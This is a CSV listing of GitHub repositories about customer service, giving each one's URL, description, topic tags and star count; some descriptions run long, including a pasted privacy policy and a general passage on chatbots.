,Url,Description,Topics,Stars
177,https://github.com/pthiagu2/DataMining.git,"Human resource, sales, customer churn and service agent evaluation",,3
178,https://github.com/NVISIA/camel-customer-service.git,Camel Customer Service,,3
179,https://github.com/PrestaShop/ps_contactinfo.git,"{""Allows you to display additional information about your store's customer service.""}","prestashop-module,native-module,hacktoberfest,prestashop",3
180,https://github.com/LoginRadius/demo.git,"{""Quick Demo Implementation for LoginRadius' Customer Registration Service and Social Login APIs and Front Interfaces.""}","loginradius,demo,customer-identity,digital-identity,enterprise",3
181,https://github.com/nomisbeme/customerapp.git,A simple customer database for a fictitious company. Kubernetes + Java backed by MongoDB. Makes heavy use of Microsoft managed services to keep things easy.,,3
182,https://github.com/woerwin/lightCS.git,light Customer Service System,,3
183,https://github.com/0xHEXSPEAK/service-customers.git,Microservice implementation of service customers,"docker,php7,yii2,microservice",3
184,https://github.com/mattmakai/video-service-django.git,Demo app showing video-powered customer service with Twilio for Python using the Django web framework.,,3
185,https://github.com/zapping0320/MLinker.git,ios chat app for customer service,,3
186,https://github.com/joehoeller/Machine-Learning-to-Predict-Customer-Loyalty-Trajectory.git,"Customer loyalty is the strength of the relationship a customer has with a business as manifested by customer purchasing more and at high frequency. There are various signal or events related to a customer’s engagement with a business. Some examples are transactions, customer service calls and social media comments. ",,3
187,https://github.com/TheNewCivilian/simple-websocket-chat.git,A very simple websocket demo application for customer service. ,"websocket,websocket-server,websocket-chat,websocket-client,customer-service",3
188,https://github.com/sanjeevai/sparkify-capstone.git,Data Analysis in Spark to Identify Customer Churn for a fictional music service(like Spotify),"f1-score,data-preprocessing,spark,stream-music,spotify,metrics",3
189,https://github.com/powertac/accounting.git,Services that mediate interactions between customers and brokers. Issues at https://github.com/powertac/powertac-server/issues,,3
190,https://github.com/aparakaki/BarberShop.git,"An application that allows customers to make service appointments. It also allows the administrator to add, edit, and delete services, as well as adjust the operating times of the business.",,3
191,https://github.com/jamasoftware-ps/Community-Reports.git,"This repo houses reports created by our Professional Services team for use with Jama Connect. If you are a self-hosted customer, you may download these and upload to your instances per the instructions in the Readme files. If you are a cloud customer, please read https://community.jamasoftware.com/blogs/kristina-king/2016/11/17/birt-and-velocity-reports-created-by-our-consulting-team-available-for-your-jama-instances for instructions on getting these uploaded to your instance.",,3
192,https://github.com/epicallan/eval-cso.git,Customer Service officer evaluation app backend - BETA,"haskell,servant,rest-api,persistent",3
193,https://github.com/cgbilke/Eats-Machina.git,Streamlined customer-facing food service application. ,,3
194,https://github.com/bcinarli/help-desk-sample.git,Customer Service Portal & Help Desk Sample,,3
195,https://github.com/lokeshsinghi/HandyMan.git,"An android application that provides an all-in-one platform for customers to hire service providers, from carpenters to technicians and beauticians. HandyMan also provides service providers opportunities to freelance with customers.",,3
196,https://github.com/10xNation/aws-ml-social-customer-care.git,"A smart Twitter monitoring service built on Amazon Machine Learning (with Amazon Mechanical Turk), Amazon Kinesis, AWS Lambda, and Amazon SNS (Simple Notification Service).",,3
197,https://github.com/ravastra/ARM-template-for-Hyperledger-Fabric-based-on-AKS.git,Customers can deploy Hyperledger Fabric Blockchain network components such as Orderer and Peer organization on Azure Kubernetes Service in their Azure Subscription by providing few simple input parameters to the solution template.  ,,3
198,https://github.com/Kuul-Development/kuul-app.git,"Webapp to connect small shops, customers and delivering services",,3
199,https://github.com/CaioQuirinoMedeiros/go_barber_app.git,:scissors: A service appointment schedule app for customers (React Native),"react-native,redux,styled-components,rocketseat",3
200,https://github.com/ibm-cloud-architecture/refarch-cognitive-analytics.git,"{""Present a reference implementation for a business application linking cognitive and analytics to learn customer's behavior and assess customer risk to churn. It is based on structured data, machine learning algorithm, data movement, and cognitive services for classifying unstructured data. ""}",,3
201,https://github.com/shubhM13/Customer-Connection-Management-Portal.git,The purpose of the project is to develop a CCMP (Customer Connection Management Portal) application for expanding the reach of the provider to the people of the state with a promising service in the sector. The portal is expected to ease the use of the services of the customers.,,3
202,https://github.com/amrzaki2000/speedy-order.git,An online shopping web application that allows many services to the customers and sellers. Websiite is managed by admins and customer service employees.,,3
203,https://github.com/mohan-mj/ANN-Churn_Modeling.git,"A Predictive Churn Model is a tool that defines the steps and stages of customer churn, or a customer leaving your service or product. Having a predictive churn model gives you awareness and quantifiable metrics to fight against in your retention efforts.",,3
204,https://github.com/mitrefccace/acedirect-public.git, Open source video software for consumer-facing call centers in both government organizations and private sector companies that will allow callers who use American Sign Language to directly interact with customer service representatives. ,,3
205,https://github.com/ange3/scheduling-optimization.git,"Scheduling algorithm solving the job request scheduling problem in the kitchen services industry. This algorithm takes domain specific inputs (set of requests, list of available resources, and prioritized performance objectives) and returns a schedule that maximizes customer utility.",,3
206,https://github.com/noshutdown-ru/ttm.git,Is a plugin for project management Redmine. Allows you to create a subscription for the various activities and keep records of customer service.,"ttm,noshutdown,subscription,redmine,ruby,redmine-plugin",3
207,https://github.com/lucasfdsilva/RESTaurant.git,This is an application built to be used as a platform to demonstrate to customers how AWS services can be used in modern applications.,"aws,nodejs,reactjs,booking-system,restaurant-management",3
208,https://github.com/rlyon/helpspot-bootstrap.git,Twitter bootstrap template for the Helpspot customer service portal.  Clone into the custom_templates directory.,,3
209,https://github.com/lindaperez/PHP_TechServices.git,"{""Project for Customer Services set of CRUD's using Symfony - PHP""}",,3
210,https://github.com/kanzucode/kanzu-support-desk.git,An all-in-one WordPress customer service ( support ticket ) solution for small businesses,,3
211,https://github.com/mehta96aayushi/Online-Food-Ordering-System.git,"This project is a web-based system which allows the user to order food from the restaurant. It is developed in ASP.NET with C# and MySQL is used to store the database. CSS and Bootstrap are also used to enhance the UI of the website. This system can be used for any restaurant for its online services. The customer can view all the food items offered by the restaurant. The customer can select, place, and edit their order. The order can be canceled within the specified time limit. The customer can also schedule an order at a particular time. Registered members get some advantages as compared to guest customers. They can write reviews about the food and the service. Payment can be done via online payment or Cash On Delivery(COD). The system also allows the admin to perform different tasks: He/She can add or delete food items from the menu, update their prices and add special offers. Admin manages all the food requests and updates the status of the order accordingly after the food is delivered. If it is COD, then the admin checks payment receipt and maintain an account for all payments done. Admin can also read the reviews given by the customers.",,3
212,https://github.com/reddyprasade/Telecommunications-Data-for-Predicting-Customer-Churn.git,"We’ll use a telecommunications data for predicting customer churn. This is a historical customer data where each row represents one customer. The data is relatively easy to understand, and you may uncover insights you can use immediately. Typically it’s less expensive to keep customers than acquire new ones, so the focus of this analysis is to predict the customers who will stay with the company.  This data set provides info to help you predict behavior to retain customers. You can analyze all relevant customer data and develop focused customer retention programs.  The data set includes information about:  Customers who left within the last month – the column is called Churn Services that each customer has signed up for – phone, multiple lines, internet, online security, online backup, device protection, tech support, and streaming TV and movies Customer account information – how long they’ve been a customer, contract, payment method, paperless billing, monthly charges, and total charges Demographic info about customers – gender, age range, and if they have partners and dependents",,3
213,https://github.com/CodeTanzania/majifix-account.git,"A representation of an entity (i.e organization, individual, customer, or client) which receiving service(s) from a particular jurisdiction","account,customer,client,citizen,majifix,person,party,organization,open311,codetanzania,feedback",3
214,https://github.com/CodeTanzania/majifix-jurisdiction.git,"A representation of an entity (e.g municipal, local government etc) responsible for addressing citizen(or customer) service request(issue).","codetanzania,majifix,majifix-module,jurisdiction,open311,citizen,feedback",3
215,https://github.com/wwang439035/Mobile-App-of-Takeout-System.git,Android mobile app for Happy Meal Take-out System providing services for customers to order meals online through smart phones. ,,3
216,https://github.com/ow/Stripe-Bulk-Delete.git,"{""Bulk delete Stripe customers if you're shutting down a service, and do some other things, too.""}",,3
217,https://github.com/addynz/Shopify-Address-Autocomplete.git,"{""Boost conversions and improve order delivery when you integrate Addy's address validation services into your Shopify checkout forms. Validate and capture accurate customer addresses with an address finder at the point of order.""}","address-lookup,address-book,shopify-address-autocomplete,shopify-apps,address-validation,address-verification,address-matching,address-parser,address-autocomplete,address-finder,boost-conversions",3
218,https://github.com/mageplaza/magento-faq.git,Magento 1 FAQ allows customers to find answered questions on articles list. Magento FAQ is an effective way to improve customer experience and reduce customer related enquiries. Point your customers with questions to instant service resource so they can find all the necessary information to make a confident purchase in your store.,,3
219,https://github.com/Azure/azure-cef.git,"Azure Customer Engagement Fabric (CEF) provides unified API and SDK to enable companies to easily interact with their customers. It includes the services of notification (SMS, Email) and authentication (social login, OTP). ",,3
220,https://github.com/simonjvardy/Aviation-Consultancy.git,Aviation Consultancy LLC is a (fictitious) consultancy business specialising in aircraft maintenance data and regulatory compliance. I designed the website to be a showcase of the available services and a means for new customers to make contact with the business allowing project and service requests to be submitted.,"aviation,aviation-consultancy-llc,milestone1",3
221,https://github.com/shiyouping/rtalpha.git,"A travel platform which provides a market place to travel agencies to sell their products, and an online portal where customers compare prices and buy travel services.",,3
222,https://github.com/TTEC-Dig-PE/SDK-iOS.git,"{""A native iOS SDK that integrates with TTEC's customer service products such as chat, voice calls, knowledge base, and journey management.""}",,3
223,https://github.com/david-saint/elis.git,:octocat: 🤖 A chat-bot built during the ISDEV hackathon. It intends to gather information about service providers and provide it to customers in their native languages without stress.,"php,laravel,chatbot,dialogflow",3
224,https://github.com/Anirudhsekar96/Analytics_Vidhya_Xtreme_ML.git,"Customer Service is one of top priorities for Aigües de Barcelona. We are in the process of redesigning our customer services to improve our relationship with the customers. To make sure, we respond to our customers efficiently, we need to predict the Volume and typologies of contacts to the call center. Further, we also need to forecast the number of resolutions opened on a daily basis. Your task is to forecast the number of contacts (by various contact types) and number of resolutions (by category and Subject) opened on a daily basis for Aigües de Barcelona. ",,3
225,https://github.com/Azure-Samples/media-services-dotnet-deliver-playready-widevine-licenses.git,"Azure Media Services (AMS) enables you to ingest, encode, add content protection, and stream your content (see this article for details). However, there are customers who only want to use AMS to deliver licenses and/or keys and do encoding, encrypting and streaming using their on-premises servers. This samples shows how to configure AMS to deliver PlayReady and/or Widevine licenses.",,3
226,https://github.com/SAP-samples/sap-iot-hyperscaler-azure-integration-ref.git,"Reference template for enabling ingestion and persistence of time series data in Azure, with integration to SAP IoT Model Agnostic Services (for a digital supply chain customer) conforming to SAP-defined schema for persistence and streaming data.","sample,sample-code,sap-iot,iot,azure,hyperscalers",3
227,https://github.com/jxiang61/Emailme-web-application.git,a feedback collection system which allows users to send survey emails to a list of customers to gather feedback about the service they provided and see the survey result directly in user dashboard,,3
228,https://github.com/litehacker/STL-view-and-change-color.git,This is a demo for website which provides 3D printing service to a customer. This file includes example where you can view and change colors for your STL file. Thanks to this guy : https://gist.github.com/bellbind/477817982584ac8473ef/,"js,3d-printing,three-js,stl-viewer",3
229,https://github.com/DigiBP/DigiBP_Livarot.git,"Digitalisation of an healthcare insurance company process to gain new customers and to asses their risks with Email-Services, Chatbot-Integration, Decision-Table usage, PDF-Contract generation and Camunda BPM-Engine.",,3
230,https://github.com/shantanuraje/Churn-Prediction.git,"The churn rate, also known as the rate of attrition, is the percentage of subscribers to a service who discontinue their subscriptions to that service within a given time period. For a company to expand its clientele, its growth rate, as measured by the number of new customers, must exceed its churn rate.",,3
231,https://github.com/a4m4/Darzi.pk-PHP-Javascript-Html-Css-Bootstrap-.git,"Darzi.pk registers a darzi after authenticating the request of the form that was submitted. The darzi when on board gets his/her separate profile so he she can edit details and also update his design portfolio which will be viewed by public so the customer can pick the best darzi according to their needs . The customer can be anyone who wants to take advantage of the online service , he/she will register , view all the darzis that are in the database , view their individual profiles and select a darzi of his/her choice . As soon as the customer places order to a specific darzi, a notification will be generated for the specific darzi profile to view the order placed.  Admin has his own separate account who acts as a moderator between the darzi and customer.",,3
232,https://github.com/rsachdeva/myinterest_income.git,"This app is being built using Ruby/Ruby on Rails/SQL DB/ActiveRecord Model and Backend/jQuery/YUI/ExtJS initially to provide a Fixed Income Management Solution with Web UI and Web Services API, specially keeping in mind customers who use the MyInterest Income Calculator iPhone App in iTunes App Store.",,3
233,https://github.com/JohnMwashuma/Shopping-Website-developed-in-Asp.-net-MVC.git,"This is a full fledged website that consist of a front-end where customers can view products, services and request quotation for the same.  While on the back-end clients can track their orders and admin users can add products and respond to clients quotation requests. ","bootstrap,mssql,entity-framework,asp-net-mvc",3
234,https://github.com/uzairnz/WhatsAround-API.git,"What’s Around! Enable user to find any service like a plumber, a wedding photographer, a yoga teacher, or an interior designer. We want to be the go-to platform helping customer’s complete projects that are important to their urban lives – everything from designing their homes to capturing key moments, learning arts, filing taxes, and getting healthier",,3
235,https://github.com/TechCodeDev/Computer_sales_and_services.git,"Computer sales and service centre will be a whole sale centre whose main product will be to provide all the latest model computers, laptops and all the accessories related to them. This centre will also deal in all the branded desktop computers and laptops. This centre will  also provide  all the original software like windows, office, antivirus, games, media players and many more. As this is also a service centre so it will provide all the technical consulting  which includes repair, training, networking  and  upgrade service to local small  businesses  as  well as home PC (personal computers) users. The company will focus on marketing, responsiveness, quality and creating and retaining customer relations.","html,css,php",3
236,https://github.com/sthuku/CozyHotels.git,"This is a major project I had to do in my last semester of my Masters. I already finished the full project and submitted it to my University.  As my professor instructed me to not to commit before the final submission, I have started commits after my final submission. I developed this hotels website in which customer will be able to get a room, an event hall, and rent a car. It also offers Restaurant Services, and spa services. I am so proud of myself that I used MVC Architecture (Asp.net Core, Entity framework core) to be able to manage the website easily, and I used AngularJs, Ajax, jQuery to get the rich functionalities. I comfortably developed this big website without having any difficulties even with tracking rooms, event halls, customers, sending emails, usage of web services, web api, and mvc architecture. ",,3
237,https://github.com/vickytr44/Loan-approval-prection.git,"A banking customer wanted to provide self-service facility for end-customers to predict success of their loan applications. The given data had to be cleansed and a prediction model had to be built. Data was pre-processed by removing redundant and zero-impact variables and applying label encoder to encode non-numeric variables. Normalization was done with standard scaler before performing cross validation with repeated K-fold and evaluating based on accuracy and confusion matrix results. Later, important features impacting prediction was determined with random forest classifier. Prediction model was built with decision tree classifier, resulting in an accuracy of 63%. ",,3
238,https://github.com/playmestudios/Simulator-3d-driving-games-Best-Simulation-2016.git,"{""Privacy Policy (Apps and Services)  1.     General  a)    Consent  By using the Services, you agree with the collection, processing and use of information described in the Policy. If you do not agree to the terms of the Policy, please do not use our Services.     b)    Scope of application  This Privacy Policy (the “Policy”) describes the collection, processing and use of information, including personal information, that you (“User” or “you”) provide to Game Link Studio („we“ or „us“) in connection with or to provide our mobile applications and services (together “our Services”).  The collection, processing and use of information in connection with our website is described in our website privacy policy in Part I above. The Policy also does not apply to your participation in sweepstakes or contests unless provided through our Services. We are not responsible for the actions of third party people or companies, the use of information you provide to them, or any products or services they may offer.     c)     Children  We do not knowingly collect personal information from children under 13 years of age. If we become aware that we have inadvertently collected personal information from a child under 13 years of age, we well promptly delete such information. We do not allow our partners to collect personally identifiably information on children under 13 years of age. However, we and our partners collect information that is not personally identifiable, such as IP-based geolocation to ensure that our Services comply with applicable laws.     e)    Updates of the Policy  We may update the Policy from time to time to reflect changes to our information practices. We encourage you to periodically review our website for the latest information on our privacy practices.     2.     Purpose of the Collection, Processing and Use of Information  We use information collected through our Services for the purposes described in the Policy or disclosed to you in connection with our Service. For example, we may use your information for the following purposes:     a)    Registration, i.e. to  create game accounts and allow users use our Services or participate in sweepstakes and contests     b)    Providing our Services, i.e. to      - identify and suggest connections with other users of our Services and enable you to communicate with other users;  - operate and improve our Services;  - respond to your comments and questions and provide customer service;  - provide and deliver products and services you request.  Whenever you use our Services, we collect data about all of your interactions with the application and with the other players inside the game via server log files.  This information may be associated with your player ID, IP address or device ID for the purpose of providing you our Services and improving them.      c)     Marketing, i.e. to  - send you related information, including confirmations, invoices, technical notices, updates, security alerts, and support and administrative messages;  - communicate with you about promotions, rewards, upcoming events, and other news about products and services offered by Us and our selected partners;     d)    Developing our Services, i.e. to  - understand you and your preferences to enhance your experience using our Services;  - link or combine it with other information we get from third parties, to help understand your preferences and provide you with better services.     5.     Sign-in Services  You can log in to our Services using sign-in services such as Facebook Connect, Google+, Google Play Game Services, or Apple Game Center. These services will authenticate your identity and provide you the option to share certain personal information with Us such as your name and email address to pre-populate our sign up form.   We may collect and record information through the Sign-in Service in accordance with the policies and terms of the respective Sign-in Service.  The information we collect when you connect your user account to an Sign-in Service may include: (1) your name, (2) your Sign-in Service user identification number and/or user name, (3) locale, city, state and country, (4) sex, (5) birth date, (6) email address, (7) profile picture or its URL, and (8) the Sign-in Service user identification numbers for your friends that are also connected to our Services.  We may offer you the opportunity to invite your contacts from a Sign-in Service so that those contacts can be located in our Services games and/or you can invite them to join you in our Services.  The contact information will not be used for other purposes. You or the addressee may request us to remove this information.     6.     Push Notifications  We may occasionally send you push notifications through our mobile applications to send you game updates, high scores and other service related notifications that may be of importance to you.  You may at any time opt-out from receiving these types of communications by turning them off at the device level through your settings.     7.     Sweepstakes and Contests  We may provide you the opportunity to participate in a sweepstakes or contest through our Services. If you participate, we will request certain personal information from you.  Participation in these sweepstakes and contests are voluntary and you therefore have a choice whether or not to disclose this information.  The requested information typically includes contact information (such as name and shipping address), and demographic information (such as zip code).  We use this information to notify winners and award prizes, to monitor traffic or personalize our Services.  We may use a third party service provider to conduct these sweepstakes or contests; that company is prohibited from using your users’ personal information for any other purpose.     8.     Analytics  a)    Cookies  A cookie is a small text file that we transfer to your device, to identify a user's device and to remember things about your visit, such as your preferences or a user name and password.  Information contained in a cookie may be linked to your personal information, such as your user ID, for purposes such as improving the quality of our Service, tailoring recommendations to your interests, and making our Services easier to use.  You can disable cookies at any time, although you may not be able to access or use features of the Service.  We may feature advertisements served by third parties that deliver cookies to your device so the content you access and advertisements you see can be tracked.  Since the third party advertising companies associate your computer/device with a number, they will be able to recognize your device each time they send you an advertisement.  These advertisers may use information about your visits to our Service and third party sites and applications in order to measure advertisement performance and to provide advertisements about goods and services of interest to you.     b)    Mobile Analytics Software  We use mobile analytics software to allow us to better understand the functionality of our Services on your device. This software may record information such as how often you use the application, the events that occur within the application, aggregated usage, performance data, and where the application was downloaded from. We do not link the information we store within the analytics software to any personal information you submit within the mobile application.""}",,3
239,https://github.com/ashirafzal/Food-Maza-Point-of-sale-.git,"Food Maza is a point of sale and inventory management system software developed C# .Net , SQL server database , SQL local database for customer DB (Local DB service), Firebase for registration purposes . The app has a responsive desktop offline app which takes cares of all the operations a fast restaurant need from inventory tracking to billing , invoice records , products search , updatation . The app also keep track records of daily , weekly , monthly and annual sales .",,3
240,https://github.com/Yogapriya2512/A-Simple-Chatbot-.git,"A chatbot (also known as a talkbot, chatterbot, Bot, IM bot, interactive agent, or Artificial Conversational Entity)The classic historic early chatbots are ELIZA (1966) and PARRY (1972).More recent notable programs include A.L.I.C.E., Jabberwacky and D.U.D.E (Agence Nationale de la Recherche and CNRS 2006). While ELIZA and PARRY were used exclusively to simulate typed conversation, many chatbots now include functional features such as games and web searching abilities. In 1984, a book called The Policeman\'s Beard is Half Constructed was published, allegedly written by the chatbot Racter (though the program as released would not have been capable of doing so).  One pertinent field of AI research is natural language processing. Usually, weak AI fields employ specialized software or programming languages created specifically for the narrow function required. For example, A.L.I.C.E. uses a markup language called AIML, which is specific to its function as a conversational agent, and has since been adopted by various other developers of, so called, Alicebots. Nevertheless, A.L.I.C.E. is still purely based on pattern matching techniques without any reasoning capabilities, the same technique ELIZA was using back in 1966. This is not strong AI, which would require sapience and logical reasoning abilities.  Jabberwacky learns new responses and context based on real-time user interactions, rather than being driven from a static database. Some more recent chatbots also combine real-time learning with evolutionary algorithms that optimise their ability to communicate based on each conversation held. Still, there is currently no general purpose conversational artificial intelligence, and some software developers focus on the practical aspect, information retrieval.  Chatbot competitions focus on the Turing test or more specific goals. Two such annual contests are the Loebner Prize and The Chatterbox Challenge (offline since 2015, materials can still be found from web archives).  According to Forrester (2015), AI will replace 16 percent of American jobs by the end of the decade.Chatbots have been used in applications such as customer service, sales and product education. However, a study conducted by Narrative Science in 2015 found that 80 percent of their respondents believe AI improves worker performance and creates jobs.[citation needed] is a computer program or an artificial intelligence which conducts a conversation via auditory or textual methods. Such programs are often designed to convincingly simulate how a human would behave as a conversational partner, thereby passing the Turing test. Chatbots are typically used in dialog systems for various practical purposes including customer service or information acquisition. Some chatterbots use sophisticated natural language processing systems, but many simpler systems scan for keywords within the input, then pull a reply with the most matching keywords, or the most similar wording pattern, from a database.  The term ""ChatterBot"" was originally coined by Michael Mauldin (creator of the first Verbot, Julia) in 1994 to describe these conversational programs.Today, most chatbots are either accessed via virtual assistants such as Google Assistant and Amazon Alexa, via messaging apps such as Facebook Messenger or WeChat, or via individual organizations\' apps and websites. Chatbots can be classified into usage categories such as conversational commerce (e-commerce via chat), analytics, communication, customer support, design, developer tools, education, entertainment, finance, food, games, health, HR, marketing, news, personal, productivity, shopping, social, sports, travel and utilities. Background",,3
241,https://github.com/robertoashworth/How-to-integrate-Neteller-Payment-method-on-your-App.git,"How to integrate Neteller Payment method on your App   Neteller.com became one of the most popular payment gateways . There are a lot of merchants depend on Neteller as a main payment method for their customers .    How Do Neteller Payment Gateways Work? (1)The cuthstomer places an order on your website by pressing the ""Submit Order"" or equivalent button, or perhaps enters their card details using an automatic phone answering service.    (2) If the order is via Application, the customer\'s phone browser encrypts the information to be sent between the browser and the merchant\'s web server through a secure socket layer.     (3)Subsequently, the merchant then forwards the transaction details to their payment gateway like Neteller , through a secure socket layer again.  (4) Afterwards, the payment gateway sends the transaction information to the payment processor used by the merchant\'s acquiring bank.    (5) Then the payment processor transfers the transaction info to the card association (Visa / Master card).   (6) To get the payment to your Neteller account, you must link a valid credit card with it either Master or Visa.   7) In an intra-transaction from Neteller to Neteller account, it is important that both accounts have valid credit cards for the transaction to go smoothly. Once the buyer makes a payment through Neteller, the amount will be deducted from their credit card balance and the seller will see the value added in their credit card directly.    (8) Protect your account and make sure that the payment goes to your valid credit card on your Neteller accounts. You must enter CVV/CVS number when entering the credit card details as the number is linked to the API created between application and Neteller accounts. Once the link is established then every transaction is going to be checked by matching the number for the transaction to go smoothly.         ( 9 ) After you get the payment to your credit card account, you will have 3 options:  The first is that you can withdraw the funds through ATM.  The second is that you can transfer the funds to your bank account.  The third is that you can deposit the funds into your Neteller account.",,3
242,https://github.com/First-iOS-Steps/TiranaTransit.git,"Tirana transit is a real time  journey planning application for the iOS platform. It is focused precisely on the public transport operating in Tirana. Using the GPS technology and the integrated map features users can see their current location and all the station around them. The location of the stations will be registered by me and it is achieved by providing the coordinates.   Users will be able to get the schedule for specific stations of a line, get the next stops in real time. The app sends notifications for their departures and users can see the connections that the current station offers with different lines. You can see all the stations of a line in the map as well. This will be implemented by using the drawing methods the swift languages provide.  Moreover, there are alerts in case of traffic disruptions. The alert will be line specific and it will pop up as a notification in the users screen.   A full network map image will be provided in order for users to see for themselves the connections and routes.  Users will be able to login and buy their tickets via the app which will avoid having a line of people waiting to buy a ticket from the driver. The ticket implementation will be done via Stripe an online service. The workflow is as follows:    Collecting credit card information from your customer Converting the credit card information to a single-use token Sending this token to your server to create a charge.  The login will be implemented by using parse in order to save the user data. Parse offers an online database storage and it is efficient for projects of this size. A chat may be provided to contact the support for any issues.   There are two courses that I am mainly interested in apart from software engineering. These are namely database and information systems, network security. Both offered in the masters program. I need the database for the user information as I already mention and the system has to be secure when it comes to making payments. I believe they are an integral part when it comes to designing software because you want your product to be as much reliable and efficient as possible. This would allow me to improve my application.",,3
